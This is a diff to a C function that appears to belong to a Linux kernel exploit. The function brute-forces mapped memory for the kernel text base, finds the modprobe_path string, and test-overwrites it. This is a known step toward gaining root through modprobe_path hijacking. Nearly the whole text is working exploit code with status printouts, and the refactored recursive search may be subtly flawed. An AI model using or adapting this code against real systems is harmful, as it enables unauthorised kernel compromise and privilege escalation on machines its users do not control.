@@ -303,13 +303,14 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 {
 	int ret = EXIT_FAILURE;
 	char *start = memory;
+	char *end = start + memory_size;
 	size_t offset = 0;
 	char *kernel_text = NULL;
 	char modprobe_path[KMOD_PATH_LEN] = { 0 };
 	size_t modprobe_path_len = 0;
-	char *search = NULL;
-	char *end = (char *)memory + memory_size;
 	char *modprobe_path_uaddr = NULL;
+
+	printf("[!] searching kernel _text in %p-%p\n", start, end);
 
 	while (offset < memory_size) {
 		if (is_kernel_base(start + offset)) {
@@ -319,7 +320,7 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 		offset += CONFIG_PHYSICAL_ALIGN;
 	}
 	if (kernel_text == NULL) {
-		printf("[!] kernel _text is not found in this huge page, try the next one\n");
+		printf("[!] kernel _text is not found in this memory region\n");
 		return NULL;
 	}
 	printf("[+] kernel _text is found at %p, now search modprobe_path\n", kernel_text);
@@ -336,35 +337,31 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 	}
 
 	modprobe_path_len = strlen(modprobe_path);
+	modprobe_path_uaddr = memmem(kernel_text, end - kernel_text, modprobe_path, modprobe_path_len);
+	if (modprobe_path_uaddr == NULL) {
+		printf("[!] modprobe_path is not found in this memory region\n");
+		return NULL;
+	}
+	printf("[+] found modprobe_path candidate at %p\n", modprobe_path_uaddr);
 
-		for (search = kernel_text; search < end;) {
-			modprobe_path_uaddr = memmem(search, end - search,
-				       modprobe_path, modprobe_path_len);
-			if (!modprobe_path_uaddr)
-				break;
+	/* Test overwriting modprobe_path */
+	modprobe_path_uaddr[0] = 'x';
 
-			printf("[+] modprobe_path candidate at %p\n", modprobe_path_uaddr);
+	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
+	if (ret == EXIT_FAILURE)
+		return NULL;
 
-			/* Test overwrite */
-			modprobe_path_uaddr[0] = 'x';
-			if (get_modprobe_path(modprobe_path, sizeof(modprobe_path)))
-				return NULL;
+	/* Return the initial value back for now */
+	modprobe_path_uaddr[0] = '/';
 
-			if (modprobe_path[0] != 'x') {
-				printf("[-] testing modprobe_path overwriting failed, searching for the next one\n");
-				modprobe_path_uaddr[0] = '/';
-				search = modprobe_path_uaddr + 1;
-				continue;
-			}
+	if (modprobe_path[0] != 'x') {
+		printf("[!] modprobe_path overwriting failed, start a new search\n");
+		/* Recursion */
+		return memmem_modprobe_path_bruteforce(modprobe_path_uaddr, end - modprobe_path_uaddr);
+	}
 
-			/* Return the initial value back for now */
-			modprobe_path_uaddr[0] = '/';
-			printf("[+] testing modprobe_path overwriting succeeded\n");
-			return modprobe_path_uaddr;
-		}
-
-	printf("[!] kernel not found in this area\n");
-	return NULL;
+	printf("[+] testing modprobe_path overwriting succeeded\n");
+	return modprobe_path_uaddr;
 }
 
 /* Fileless approach */
